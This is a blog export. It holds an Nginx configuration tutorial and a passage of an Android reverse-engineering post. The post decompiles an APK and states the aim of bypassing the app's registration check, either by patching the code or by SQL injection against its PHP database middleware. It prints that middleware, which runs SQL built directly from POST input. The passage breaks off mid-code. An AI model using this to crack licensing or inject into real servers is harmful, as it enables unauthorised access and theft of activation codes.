<p>模块：<span class="exturl" data-url="aHR0cDovL25naW54Lm9yZy9lbi9kb2NzL2h0dHAvbmd4X2h0dHBfcmVmZXJlcl9tb2R1bGUuaHRtbA==">ngx_http_referer_module<i class="fa fa-external-link-alt"></i></span> 作用：通过限制referer实现防盗链功能</p>
<p>语法：<code>none</code>代表允许空referer，<code>blocked</code>代表允许非标准的请求（如：没带协议头的） <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Syntax:   valid_referers none | blocked | server_names | string ...;</span><br><span class="line">Default:  —</span><br><span class="line">Context:  server, location</span><br></pre></td></tr></table></figure></p>
<p>示例： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location ~ .*\.(jpg|gif|png)$ &#123;</span><br><span class="line">    valid_referers none blocked 47.107.102.19;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$invalid_referer</span>) &#123;</span><br><span class="line">        <span class="built_in">return</span> 403;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="gzip压缩">gzip压缩</h3>
<p>模块：<span class="exturl" data-url="aHR0cDovL25naW54Lm9yZy9lbi9kb2NzL2h0dHAvbmd4X2h0dHBfZ3ppcF9tb2R1bGUuaHRtbA==">ngx_http_gzip_module<i class="fa fa-external-link-alt"></i></span> 作用：开启gzip压缩，浏览器会自动解压，可减少服务器带宽消耗</p>
<p>语法： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启用或关闭gzip</span></span><br><span class="line">Syntax:   gzip on | off;</span><br><span class="line">Default:  gzip off;</span><br><span class="line">Context:  http, server, location, <span class="keyword">if</span> <span class="keyword">in</span> location</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定文件压缩比</span></span><br><span class="line">Syntax:   gzip_comp_level level;</span><br><span class="line">Default:  gzip_comp_level 1;</span><br><span class="line">Context:  http, server, location</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定HTTP版本</span></span><br><span class="line">Syntax:   gzip_http_version 1.0 | 1.1;</span><br><span class="line">Default:  gzip_http_version 1.1;</span><br><span class="line">Context:  http, server, location</span><br></pre></td></tr></table></figure></p>
<p>示例： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location ~ .*\.(jpg|gif|png)$ &#123;</span><br><span class="line">    gzip on;</span><br><span class="line">    gzip_http_version 1.1;</span><br><span class="line">    gzip_comp_level 2;</span><br><span class="line">    gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="代理服务">代理服务</h3>
<p>模块：<span class="exturl" data-url="aHR0cDovL25naW54Lm9yZy9lbi9kb2NzL2h0dHAvbmd4X2h0dHBfcHJveHlfbW9kdWxlLmh0bWw=">ngx_http_proxy_module<i class="fa fa-external-link-alt"></i></span> 作用：当应用程序的后端服务不对外暴露时，可以使用反向代理</p>
<p>语法： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 代理地址</span></span><br><span class="line">Syntax:   proxy_pass URL;</span><br><span class="line">Default:  —</span><br><span class="line">Context:  location, <span class="keyword">if</span> <span class="keyword">in</span> location, limit_except</span><br><span class="line"></span><br><span class="line"><span class="comment"># 头部设置</span></span><br><span class="line">Syntax:   proxy_set_header field value;</span><br><span class="line">Default:  proxy_set_header Host <span class="variable">$proxy_host</span>;</span><br><span class="line">          proxy_set_header Connection close;</span><br><span class="line">Context:  http, server, location</span><br><span class="line"></span><br><span class="line"><span class="comment"># 超时时间（Nginx到代理后端建立连接的时间）</span></span><br><span class="line">Syntax:   proxy_connect_timeout time;</span><br><span class="line">Default:  proxy_connect_timeout 60s;</span><br><span class="line">Context:  http, server, location</span><br><span class="line"></span><br><span class="line"><span class="comment"># 超时时间（建立连接后的等待时间，即服务器处理请求的时间）</span></span><br><span class="line">Syntax:   proxy_read_timeout time;</span><br><span class="line">Default:  proxy_read_timeout 60s;</span><br><span class="line">Context:  http, server, location</span><br><span class="line"></span><br><span class="line"><span class="comment"># 超时时间（服务端请求完，发送给客户端的时间）</span></span><br><span class="line">Syntax:   proxy_send_timeout time;</span><br><span class="line">Default:  proxy_send_timeout 60s;</span><br><span class="line">Context:  http, server, location</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 代理缓存设置</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 缓存路径</span></span><br><span class="line">Syntax:   proxy_cache_path path [levels=levels] [use_temp_path=on|off] keys_zone=name:size [inactive=time] [max_size=size] [manager_files=number] [manager_sleep=time] [manager_threshold=time] [loader_files=number] [loader_sleep=time] [loader_threshold=time] [purger=on|off] [purger_files=number] [purger_sleep=time] [purger_threshold=time];</span><br><span class="line">Default:  —</span><br><span class="line">Context:  http</span><br><span class="line"></span><br><span class="line"><span class="comment"># 缓存zone名称</span></span><br><span class="line">Syntax:   proxy_cache zone | off;</span><br><span class="line">Default:  proxy_cache off;</span><br><span class="line">Context:  http, server, location</span><br><span class="line"></span><br><span class="line"><span class="comment"># 缓存的过期周期，可按code状态码分别设置</span></span><br><span class="line">Syntax:   proxy_cache_valid [code ...] time;</span><br><span class="line">Default:  —</span><br><span class="line">Context:  http, server, location</span><br><span class="line"></span><br><span class="line"><span class="comment"># 缓存的key</span></span><br><span class="line">Syntax:   proxy_cache_key string;</span><br><span class="line">Default:  proxy_cache_key $scheme$proxy_host<span class="variable">$request_uri</span>;</span><br><span class="line">Context:  http, server, location</span><br></pre></td></tr></table></figure></p>
<p>示例： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 正向代理示例(需使用代理工具设置代理地址)</span></span><br><span class="line">resolver 114.114.114.114;</span><br><span class="line">location / &#123;</span><br><span class="line">    proxy_pass http://$http_host<span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反向代理示例</span></span><br><span class="line">location / &#123;</span><br><span class="line">    proxy_pass http://127.0.0.1:8080;</span><br><span class="line">    include proxy_params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 代理缓存示例</span></span><br><span class="line">proxy_cache_path /data/nginx/cache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=60m use_temp_path=off;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:8080;</span><br><span class="line">        proxy_cache my_cache;</span><br><span class="line">        proxy_cache_valid 200 304 12h;</span><br><span class="line">        proxy_cache_valid any 10m;</span><br><span class="line">        proxy_cache_key $host$uri$is_args<span class="variable">$args</span>;</span><br><span class="line">        add_header  Nginx-Cache <span class="string">&quot;<span class="variable">$upstream_cache_status</span>&quot;</span>;  </span><br><span class="line">        </span><br><span class="line">        include proxy_params;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>将重复的配置抽离到单独的文件，方便复用 <figure class="highlight bash"><figcaption><span>proxy_params</span></figcaption><table><tr><td class="code"><pre><span class="line">proxy_redirect default;</span><br><span class="line"></span><br><span class="line">proxy_set_header Host <span class="variable">$http_host</span>;</span><br><span class="line"><span class="comment"># 在一级代理设置X-Real-IP用于传递用户真实IP</span></span><br><span class="line">proxy_set_header X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line"></span><br><span class="line">proxy_connect_timeout 30;</span><br><span class="line">proxy_read_timeout 60;</span><br><span class="line">proxy_send_timeout 60;</span><br><span class="line"></span><br><span class="line">proxy_buffer_size 32k;</span><br><span class="line">proxy_buffering on;</span><br><span class="line">proxy_buffers 4 128k;</span><br><span class="line">proxy_busy_buffers_size 256k;</span><br><span class="line">proxy_max_temp_file_size 256k;</span><br></pre></td></tr></table></figure></p>
<h3 id="负载均衡">负载均衡</h3>
<p>模块：<span class="exturl" data-url="aHR0cDovL25naW54Lm9yZy9lbi9kb2NzL2h0dHAvbmd4X2h0dHBfdXBzdHJlYW1fbW9kdWxlLmh0bWw=">ngx_http_upstream_module<i class="fa fa-external-link-alt"></i></span> 作用：可以通过负载均衡提高服务的可用性</p>
<p>语法： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Syntax:   upstream name &#123; ... &#125;</span><br><span class="line">Default:  —</span><br><span class="line">Context:  http</span><br></pre></td></tr></table></figure></p>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">参数</th>
<th style="text-align: left;">说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">weight</td>
<td style="text-align: left;">权重越大，分配到的机率越高</td>
</tr>
<tr class="even">
<td style="text-align: left;">down</td>
<td style="text-align: left;">当前的server暂不参与负载均衡</td>
</tr>
<tr class="odd">
<td style="text-align: left;">backup</td>
<td style="text-align: left;">预留的备份服务器</td>
</tr>
<tr class="even">
<td style="text-align: left;">max_fails</td>
<td style="text-align: left;">允许请求失败的次数</td>
</tr>
<tr class="odd">
<td style="text-align: left;">fail_timeout</td>
<td style="text-align: left;">经过max_fails失败后，服务暂停的时间</td>
</tr>
<tr class="even">
<td style="text-align: left;">max_conns</td>
<td style="text-align: left;">限制最大的接收的连接数</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">调度算法</th>
<th style="text-align: left;">说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">轮询</td>
<td style="text-align: left;">按时间顺序分配到不同的后端服务器</td>
</tr>
<tr class="even">
<td style="text-align: left;">加权轮询</td>
<td style="text-align: left;">weight值越大，分配到的访问机率越高</td>
</tr>
<tr class="odd">
<td style="text-align: left;">ip_hash</td>
<td style="text-align: left;">按访问IP的hash结果分配，同个IP分配到同一个后端</td>
</tr>
<tr class="even">
<td style="text-align: left;">least_conn</td>
<td style="text-align: left;">最少链接数，哪个机器链接数少就往哪个分发</td>
</tr>
<tr class="odd">
<td style="text-align: left;">url_hash</td>
<td style="text-align: left;">按照访问的URL hash结果分配，每个URL分配到同一个后端</td>
</tr>
<tr class="even">
<td style="text-align: left;">hash关键数值</td>
<td style="text-align: left;">hash自定义的key</td>
</tr>
</tbody>
</table>
<p>示例： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upstream backend &#123;</span><br><span class="line">    server backend1.example.com      weight=5;</span><br><span class="line">    server backend2.example.com:8080 down;</span><br><span class="line">    server backend2.example.com:8081 backup;</span><br><span class="line">    server backend2.example.com:8082 max_fails=1 fail_timeout=10s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://backend;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="https服务">HTTPS服务</h3>
<p>模块：<span class="exturl" data-url="aHR0cDovL25naW54Lm9yZy9lbi9kb2NzL2h0dHAvbmd4X2h0dHBfc3NsX21vZHVsZS5odG1s">ngx_http_ssl_module<i class="fa fa-external-link-alt"></i></span> 作用：提高传输安全性</p>
<p>语法： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Syntax:   ssl on | off;</span><br><span class="line">Default:  ssl off;</span><br><span class="line">Context:  http, server</span><br><span class="line"></span><br><span class="line">Syntax:   ssl_certificate file;</span><br><span class="line">Default:  —</span><br><span class="line">Context:  http, server</span><br><span class="line"></span><br><span class="line">Syntax:   ssl_certificate_key file;</span><br><span class="line">Default:  —</span><br><span class="line">Context:  http, server</span><br></pre></td></tr></table></figure></p>
<p>示例 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">   listen       443;</span><br><span class="line">   server_name  hujinbo.me;</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># HTTPS服务优化：1.激活keepalive长连接</span></span><br><span class="line">   keepalive_timeout 100;</span><br><span class="line">   </span><br><span class="line">   ssl on;</span><br><span class="line">   ssl_certificate /usr/<span class="built_in">local</span>/nginx/conf/cert.pem;</span><br><span class="line">   ssl_certificate_key /usr/<span class="built_in">local</span>/nginx/conf/cert.key;</span><br><span class="line">   <span class="comment"># HTTPS服务优化：2.设置ssl session缓存</span></span><br><span class="line">   ssl_session_cache   shared:SSL:10m;</span><br><span class="line">   ssl_session_timeout 10m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="状态监控">状态监控</h3>
<p>模块：<span class="exturl" data-url="aHR0cDovL25naW54Lm9yZy9lbi9kb2NzL2h0dHAvbmd4X2h0dHBfc3R1Yl9zdGF0dXNfbW9kdWxlLmh0bWw=">ngx_http_stub_status_module<i class="fa fa-external-link-alt"></i></span><br />
作用：监控Nginx客户端状态</p>
<p>语法： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Syntax:   stub_status;</span><br><span class="line">Default:  —</span><br><span class="line">Context:  server, location</span><br></pre></td></tr></table></figure></p>
<p>示例： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location = /basic_status &#123;</span><br><span class="line">    stub_status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="最佳实践">最佳实践</h2>
<h3 id="docker部署nginx">Docker部署nginx</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run \</span><br><span class="line">-d \</span><br><span class="line">--name hujinbo.me \</span><br><span class="line">-p 80:80 \</span><br><span class="line">-v /home/data/nginx/hujinbo.me/nginx.conf:/etc/nginx/nginx.conf \</span><br><span class="line">-v /home/data/nginx/hujinbo.me/conf.d:/etc/nginx/conf.d \</span><br><span class="line">-v /home/data/nginx/hujinbo.me/ssl:/etc/nginx/ssl \</span><br><span class="line">-v /home/data/nginx/hujinbo.me/<span class="built_in">log</span>:/var/<span class="built_in">log</span>/nginx/ \</span><br><span class="line">nginx</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓逆向分析之抓包、拆包、打包、签名</title>
    <url>/posts/56548/</url>
    <content><![CDATA[<blockquote>
<p>本文章仅供学习交流，请勿用于入侵等非法用途！</p>
</blockquote>
<h2 id="环境准备">环境准备</h2>
<ol type="1">
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cub3JhY2xlLmNvbS9qYXZhL3RlY2hub2xvZ2llcy9qYXZhc2UvamF2YXNlLWpkazgtZG93bmxvYWRzLmh0bWw=">下载JDK1.8<i class="fa fa-external-link-alt"></i></span>：准备Java环境，配置好环境变量；</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9pYm90cGVhY2hlcy5naXRodWIuaW8vQXBrdG9vbC9pbnN0YWxsLw==">下载Apktool<i class="fa fa-external-link-alt"></i></span>：编译译和反编译apk，从中提取图片等资源</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B4YjE5ODgvZGV4Mmphci9yZWxlYXNlcy9kb3dubG9hZC8yLjAvZGV4LXRvb2xzLTIuMC56aXA=">下载dex2jar<i class="fa fa-external-link-alt"></i></span>：将<code>classes.dex</code>反编译为jar源码文件</li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy50ZWxlcmlrLmNvbS9kb3dubG9hZC9maWRkbGVy">下载Fiddler<i class="fa fa-external-link-alt"></i></span>：抓包工具，分析APP发送的请求</li>
</ol>
<h2 id="拆包">拆包</h2>
<ol type="1">
<li><p>使用apktool反编译apk<br />
Win用户下载<code>apktool.bat</code>和<code>apktool_x.x.x.jar</code>并重名为<code>apktool.jar</code>，将需要反编译的apk包和这2个文件放在同个目录下： <img data-src="https://img.hujinbo.me/blog/MSXrd8.png" /> 执行以下命令，可以得到<code>.smali</code>文件，后续基于此文件进行修改。 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apktool d demo.apk</span><br></pre></td></tr></table></figure> <span id="more"></span> <img data-src="https://img.hujinbo.me/blog/3oY8zB.png" /></p></li>
<li><p>使用dex2jar反编译<code>classes.dex</code>获取Java源码<br />
使用解压工具打开apk安装包，将<code>classes.dex</code>复制到dex2jar-2.0的目录下： <img data-src="https://img.hujinbo.me/blog/pwADDr.png" /> 执行以下命令，可以得到<code>classes-dex2jar.jar</code>文件： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">d2j-dex2jar classes.dex</span><br></pre></td></tr></table></figure></p></li>
<li><p>使用IDEA查看源码<br />
将步骤2得到的<code>classes-dex2jar.jar</code>文件复制到Idea工程，右键选择<code>Add as Library</code>添加为库，即可查看源码。 <img data-src="https://img.hujinbo.me/blog/EMdRme.png" /></p></li>
</ol>
<h2 id="源码分析">源码分析</h2>
<p>通过上述代码分析得知，该包使用的是E4A程序编写，找到验证码相关的模块，关键源码如下： <img data-src="https://img.hujinbo.me/blog/NxKIgf.png" /> 通过源码分析，发现该APP使用连接Mysql数据库的方式进行激活、验证，所以去掉注册码验证的方式有两种，一是将这部分代码去掉，二是通过SQL注入查询激活码。 第一种只需修改源码即可，而第二种需要先弄清楚E4A库提供的Mysql连接库的连接校验逻辑，寻找注入点。</p>
<p>通过<span class="exturl" data-url="aHR0cHM6Ly93d3cudzNjc2Nob29sLmNuL2VlcmFzX2U0YS9lZXJhc19lNGEtaDN5cjJnZ3IuaHRtbA==">E4A与MySql数据库连接<i class="fa fa-external-link-alt"></i></span>了解到，这里使用了php作为的mysql中间件连接，虽然在反编译的源码中不包含数据库的账号密码，但里面包含了数据库的插入、更新、删除操作，所以在php中间件中登记的mysql账号是包含这些权限的，可以分析源码后，寻找注入点。 安卓E4A，通过类库文档，查询数据库相关类型的API描述，以助于源码分析，并在安装目录下找到php中间件源码。 <img data-src="https://img.hujinbo.me/blog/o3XyRq.png" /> <figure class="highlight php"><figcaption><span>openapi_unsafe.php</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(E_ALL &amp; ~E_NOTICE); </span><br><span class="line">    ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;mysql.class.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$receive</span> = base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;captcha&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(substr(<span class="variable">$receive</span>,<span class="number">0</span>,<span class="number">6</span>) == <span class="string">&#x27;MSDATA&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$mainbody</span> = substr(<span class="variable">$receive</span>,<span class="number">6</span>);</span><br><span class="line">        <span class="variable">$mainbody</span> = explode(<span class="string">&quot;|*|&quot;</span>,<span class="variable">$mainbody</span>);</span><br><span class="line">        <span class="keyword">if</span>(count(<span class="variable">$mainbody</span>)&lt;<span class="number">6</span>)&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$mysql_s</span> = <span class="keyword">new</span> mysql();</span><br><span class="line">        <span class="comment">/*  echo &quot;Hostname=&quot;.$mainbody[0].&quot;, &quot;;</span></span><br><span class="line"><span class="comment">            echo &quot;User=&quot;.$mainbody[1].&quot;, &quot;;</span></span><br><span class="line"><span class="comment">            echo &quot;Password=&quot;.$mainbody[2].&quot;, &quot;;</span></span><br><span class="line"><span class="comment">            echo &quot;Database=&quot;.$mainbody[3].&quot;, &quot;;</span></span><br><span class="line"><span class="comment">            echo &quot;Code=&quot;.$mainbody[4].&quot;, &quot;;</span></span><br><span class="line"><span class="comment">            echo &quot;Comm=&quot;.$mainbody[5];</span></span><br><span class="line"><span class="comment">        */</span> </span><br><span class="line">        <span class="variable">$conn</span>=<span class="variable">$mysql_s</span>-&gt;construct(<span class="variable">$mainbody</span>[<span class="number">0</span>],<span class="variable">$mainbody</span>[<span class="number">1</span>],<span class="variable">$mainbody</span>[<span class="number">2</span>],<span class="variable">$mainbody</span>[<span class="number">3</span>],rand(<span class="number">0</span>, <span class="number">32000</span>),<span class="variable">$mainbody</span>[<span class="number">4</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$conn</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$mainbody</span>[<span class="number">5</span>]==<span class="string">&quot;Connect&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ConnectSucceeded&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$mainbody</span>[<span class="number">5</span>]==<span class="string">&quot;Getinfo&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Getinfo&quot;</span>.<span class="variable">$mysql_s</span>-&gt;mysql_server(<span class="variable">$mainbody</span>[<span class="number">6</span>]);	</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$mainbody</span>[<span class="number">5</span>]==<span class="string">&quot;Getip&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Getip&quot;</span>.<span class="variable">$mysql_s</span>-&gt;getip();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$mainbody</span>[<span class="number">5</span>]==<span class="string">&quot;STables&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;STables&quot;</span>.<span class="variable">$mysql_s</span>-&gt;show_tables(<span class="variable">$mainbody</span>[<span class="number">3</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$mainbody</span>[<span class="number">5</span>]==<span class="string">&quot;RQuery&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$sql</span>=<span class="variable">$mysql_s</span>-&gt;query(<span class="variable">$mainbody</span>[<span class="number">6</span>]);</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_row(<span class="variable">$sql</span>))</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="keyword">foreach</span> (<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">               <span class="variable">$txt</span> .= <span class="variable">$a</span>.<span class="variable">$mainbody</span>[<span class="number">7</span>];</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="variable">$txt</span> .= <span class="variable">$mainbody</span>[<span class="number">8</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;QRQuery&quot;</span>.<span class="variable">$txt</span>;            </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$mainbody</span>[<span class="number">5</span>]==<span class="string">&quot;Geterror&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Geterror&quot;</span>.<span class="variable">$mysql_s</span>-&gt;geterror();           </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$mainbody</span>[<span class="number">5</span>]==<span class="string">&quot;GRNum&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$rs</span>=<span class="variable">$mysql_s</span>-&gt;query(<span class="string">&quot;SELECT count(*) FROM &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">6</span>].<span class="string">&quot; WHERE &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">7</span>]);</span><br><span class="line">            <span class="variable">$myrow</span> = mysql_fetch_array(<span class="variable">$rs</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;GRNum&quot;</span>.<span class="string">&quot;<span class="subst">$myrow</span>[0]&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$mainbody</span>[<span class="number">5</span>]==<span class="string">&quot;GRNumNC&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$rs</span>=<span class="variable">$mysql_s</span>-&gt;query(<span class="string">&quot;SELECT count(*) FROM &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">6</span>]);</span><br><span class="line">            <span class="variable">$myrow</span> = mysql_fetch_array(<span class="variable">$rs</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;GRNumNC&quot;</span>.<span class="string">&quot;<span class="subst">$myrow</span>[0]&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$mainbody</span>[<span class="number">5</span>]==<span class="string">&quot;IsData&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$sql</span>=<span class="variable">$mysql_s</span>-&gt;query(<span class="string">&quot;INSERT INTO &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">6</span>].<span class="string">&quot; (&quot;</span>.<span class="variable">$mainbody</span>[<span class="number">7</span>].<span class="string">&quot;) VALUES (&quot;</span>.<span class="variable">$mainbody</span>[<span class="number">8</span>].<span class="string">&quot;)&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;IsData&quot;</span>.<span class="string">&quot;Successfully&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$mainbody</span>[<span class="number">5</span>]==<span class="string">&quot;GetID&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;GetID&quot;</span>.<span class="variable">$mysql_s</span>-&gt;insert_id();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$mainbody</span>[<span class="number">5</span>]==<span class="string">&quot;GRMax&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$rs</span>=<span class="variable">$mysql_s</span>-&gt;query(<span class="string">&quot;SELECT max(&quot;</span>.<span class="variable">$mainbody</span>[<span class="number">7</span>].<span class="string">&quot;) FROM &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">6</span>]);</span><br><span class="line">            <span class="variable">$myrow</span> = mysql_fetch_array(<span class="variable">$rs</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;GRMax&quot;</span>.<span class="string">&quot;<span class="subst">$myrow</span>[0]&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$mainbody</span>[<span class="number">5</span>]==<span class="string">&quot;CgData&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$sql</span>=<span class="variable">$mysql_s</span>-&gt;query(<span class="string">&quot;UPDATE &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">6</span>].<span class="string">&quot; SET &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">7</span>].<span class="string">&quot; WHERE &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">8</span>]);	</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;CgData&quot;</span>.<span class="string">&quot;Successfully&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$mainbody</span>[<span class="number">5</span>]==<span class="string">&quot;CcData&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$sql</span>=<span class="variable">$mysql_s</span>-&gt;query(<span class="string">&quot;DELETE FROM  &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">6</span>].<span class="string">&quot; WHERE &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">7</span>]);	</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;CcData&quot;</span>.<span class="string">&quot;Successfully&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$mainbody</span>[<span class="number">5</span>]==<span class="string">&quot;QrData&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$mainbody</span>[<span class="number">8</span>] != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                <span class="variable">$sql</span>=<span class="variable">$mysql_s</span>-&gt;query(<span class="string">&quot;SELECT &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">7</span>].<span class="string">&quot; FROM &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">6</span>].<span class="string">&quot; WHERE &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">8</span>]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$sql</span>=<span class="variable">$mysql_s</span>-&gt;query(<span class="string">&quot;SELECT &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">7</span>].<span class="string">&quot; FROM &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">6</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_row(<span class="variable">$sql</span>))</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="keyword">foreach</span> (<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">               <span class="variable">$txt</span> .= <span class="variable">$a</span>.<span class="string">&#x27;|.+.|&#x27;</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="variable">$txt</span> .= <span class="string">&#x27;|.*.|&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;QrData&quot;</span>.<span class="variable">$txt</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$mainbody</span>[<span class="number">5</span>]==<span class="string">&quot;QLData&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$mainbody</span>[<span class="number">8</span>] != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                <span class="variable">$sql</span>=<span class="variable">$mysql_s</span>-&gt;query(<span class="string">&quot;SELECT &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">7</span>].<span class="string">&quot; FROM 